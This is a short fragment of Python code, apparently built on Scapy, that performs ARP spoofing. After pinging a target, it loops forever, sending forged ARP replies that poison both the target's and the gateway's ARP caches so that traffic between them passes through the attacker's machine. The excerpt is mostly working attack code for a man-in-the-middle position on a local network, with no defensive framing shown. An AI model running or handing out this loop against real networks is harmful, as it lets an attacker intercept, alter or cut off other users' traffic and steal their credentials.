...
#        gwMac   = input("Give me gateWay Mac\t: ")
        ...
        subprocess.check_output(['ping', '-c', '1', tgIP])
        ...
        while True :
            try :
                sendp( Ether(dst=tgMac,src=myMac)/ARP(hwsrc=myMac, psrc=gwIP, pdst=tgIP) )
                sendp( Ether(dst=gwMac,src=myMac)/ARP(hwsrc=myMac, psrc=tgIP, pdst=gwIP) )
                time.sleep(1)
